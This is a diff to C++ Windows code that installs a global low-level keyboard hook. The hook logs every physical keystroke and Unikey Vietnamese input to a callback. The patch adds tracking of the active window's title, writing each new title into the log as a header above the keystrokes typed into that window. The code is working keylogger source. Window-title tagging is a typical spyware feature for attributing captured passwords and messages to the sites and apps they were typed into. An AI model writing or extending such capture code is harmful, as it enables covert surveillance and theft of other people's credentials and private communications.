@@ -26,7 +26,10 @@ private:
 
     // Biến trạng thái Logic
     inline static bool lastKeyWasPhysical = false;
-    inline static bool isShiftHeld = false; // Tự theo dõi Shift
+    inline static bool isShiftHeld = false;
+
+    // [MỚI] Biến lưu tiêu đề cửa sổ cũ
+    inline static std::string lastWindowTitle = "";
 
     static std::string WideToUtf8(const std::wstring &ws)
     {
@@ -38,6 +41,20 @@ private:
         return out;
     }
 
+    // [MỚI] Hàm lấy tiêu đề cửa sổ
+    static std::string GetActiveWindowTitle()
+    {
+        HWND hwnd = GetForegroundWindow();
+        if (!hwnd)
+            return "";
+        wchar_t title[1024];
+        if (GetWindowTextW(hwnd, title, 1024) > 0)
+        {
+            return WideToUtf8(title);
+        }
+        return "";
+    }
+
     static LRESULT CALLBACK HookProc(int nCode, WPARAM wParam, LPARAM lParam)
     {
         if (nCode == HC_ACTION)
@@ -47,7 +64,6 @@ private:
             bool isInjected = (pKey->flags & LLKHF_INJECTED) != 0;
 
             // --- 1. THEO DÕI TRẠNG THÁI SHIFT THỦ CÔNG ---
-            // Giúp sửa lỗi "khôNg" và "nàY" do GetKeyState bị sai lệch
             if (vk == VK_LSHIFT || vk == VK_RSHIFT || vk == VK_SHIFT)
             {
                 if (wParam == WM_KEYDOWN)
@@ -59,22 +75,38 @@ private:
             // Chỉ xử lý sự kiện KeyDown (Nhấn phím)
             if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)
             {
+                // ============================================================
+                // [MỚI] KIỂM TRA CỬA SỔ TRƯỚC KHI XỬ LÝ PHÍM
+                // ============================================================
+                // Chỉ kiểm tra khi là phím thật (để tránh check liên tục khi Unikey gửi phím ảo)
+                if (!isInjected)
+                {
+                    std::string currentTitle = GetActiveWindowTitle();
+                    if (!currentTitle.empty() && currentTitle != lastWindowTitle)
+                    {
+                        lastWindowTitle = currentTitle;
+                        if (callback)
+                        {
+                            // Gửi log tiêu đề (xuống dòng cho đẹp)
+                            callback("\n\n[ " + currentTitle + " ]\n");
+                        }
+                    }
+                }
+                // ============================================================
 
                 // ============================================================
-                // A. XỬ LÝ PHÍM VẬT LÝ (NGƯỜI DÙNG GÕ)
+                // A. XỬ LÝ PHÍM VẬT LÝ (CODE CŨ CỦA BẠN - GIỮ NGUYÊN)
                 // ============================================================
                 if (!isInjected)
                 {
-                    // Bỏ qua phím chức năng không ra chữ
                     if ((vk >= 0xA0 && vk <= 0xA5) || vk == VK_CAPITAL ||
                         (vk >= VK_F1 && vk <= VK_F24) || vk == VK_LWIN || vk == VK_RWIN)
                     {
                         return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                     }
 
-                    lastKeyWasPhysical = true; // Đánh dấu đây là phím thật
+                    lastKeyWasPhysical = true;
 
-                    // Xử lý Backspace/Enter/Tab thật
                     if (vk == VK_BACK)
                     {
                         if (callback)
@@ -94,11 +126,9 @@ private:
                         return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                     }
 
-                    // Dịch ký tự (Sử dụng isShiftHeld tự theo dõi)
                     BYTE keyboardState[256];
                     GetKeyboardState(keyboardState);
 
-                    // Force Shift state theo biến của mình (Chính xác hơn GetKeyState)
                     keyboardState[VK_SHIFT] = isShiftHeld ? 0x80 : 0;
                     if (GetKeyState(VK_CAPITAL) & 0x0001)
                         keyboardState[VK_CAPITAL] = 0x01;
@@ -116,11 +146,10 @@ private:
                 }
 
                 // ============================================================
-                // B. XỬ LÝ PHÍM ẢO (UNIKEY/IME GỬI)
+                // B. XỬ LÝ PHÍM ẢO (CODE CŨ CỦA BẠN - GIỮ NGUYÊN)
                 // ============================================================
                 else
                 {
-                    // 1. Double Backspace (Fix lỗi lặp chữ aá)
                     if (vk == VK_BACK)
                     {
                         if (lastKeyWasPhysical)
@@ -140,7 +169,6 @@ private:
                         return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                     }
 
-                    // 2. Ký tự Unicode (Fix lỗi chữ Việt)
                     if (vk == VK_PACKET)
                     {
                         wchar_t ch = static_cast<wchar_t>(pKey->scanCode);
@@ -153,13 +181,10 @@ private:
                         return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
                     }
 
-                    // 3. Ký tự ảo khác (Fix lỗi nàY -> này)
-                    // Unikey gửi lại các ký tự base (a, b, c...) để ghép từ
                     BYTE keyboardState[256];
                     GetKeyboardState(keyboardState);
 
-                    // QUAN TRỌNG: Với phím ảo thường, ta ép tắt Shift để tránh lỗi viết hoa
-                    // (trừ khi CapsLock đang bật)
+                    // Logic quan trọng cho tiếng Việt: Reset Shift khi là phím ảo
                     keyboardState[VK_SHIFT] = 0;
                     if (GetKeyState(VK_CAPITAL) & 0x0001)
                         keyboardState[VK_CAPITAL] = 0x01;
@@ -184,8 +209,8 @@ private:
     static void Loop()
     {
         threadId = GetCurrentThreadId();
-        // Khởi tạo trạng thái Shift ban đầu
         isShiftHeld = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
+        lastWindowTitle = ""; // Reset tiêu đề
 
         HINSTANCE hInst = GetModuleHandle(nullptr);
         keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, hInst, 0);
